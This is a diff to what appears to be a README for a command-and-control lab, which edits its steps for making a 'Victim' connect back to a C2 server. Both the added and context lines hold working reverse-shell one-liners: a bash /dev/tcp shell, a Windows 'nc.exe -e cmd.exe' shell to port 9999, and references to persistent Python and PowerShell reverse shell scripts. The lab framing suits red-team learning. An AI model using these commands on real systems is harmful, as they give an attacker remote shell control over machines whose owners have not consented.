@@ -25,8 +25,7 @@ Build and understand C2 infrastructure.
 3. Have Victim connect to C2
     - Linux / MacOS
       - BASH
-      - This will drop the moment the C2 server 'drops'
-          - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+          - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
       - Python reverse shell
           - This will continue to connect to the C2 server even after it 'drops'
           - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
@@ -36,7 +35,6 @@ Build and understand C2 infrastructure.
           - `./stardestroyer`
     - Windows
         - NETCAT
-        - This will drop the moment the C2 server 'drops'
             - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
         - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
             - On Kali
@@ -60,8 +58,7 @@ Build and understand C2 infrastructure.
 2. Have Victim connect to C2
     - Linux / MacOS
       - BASH
-      - This will drop the moment the C2 server 'drops'
-          - `bash -i >& /dev/tcp/<C2-IP>/9999 0>&1`
+          - `bash -c "bash -i >& /dev/tcp/<C2-SERVER-IP>/9999 0>&1"`
       - Python reverse shell
           - This will continue to connect to the C2 server even after it 'drops'
           - Modify the 'SERVER_IP = ' in `stardestroyer.py`   
@@ -71,7 +68,6 @@ Build and understand C2 infrastructure.
           - `./stardestroyer`
     - Windows
         - NETCAT
-        - This will drop the moment the C2 server 'drops'
             - `C:\Windows\Temp\nc.exe -e cmd.exe $C2-IP 9999`
         - If your C2 OS is Kali, you can host a python http.server with nc.exe and run `stardestroyer.ps1`
             - On Kali
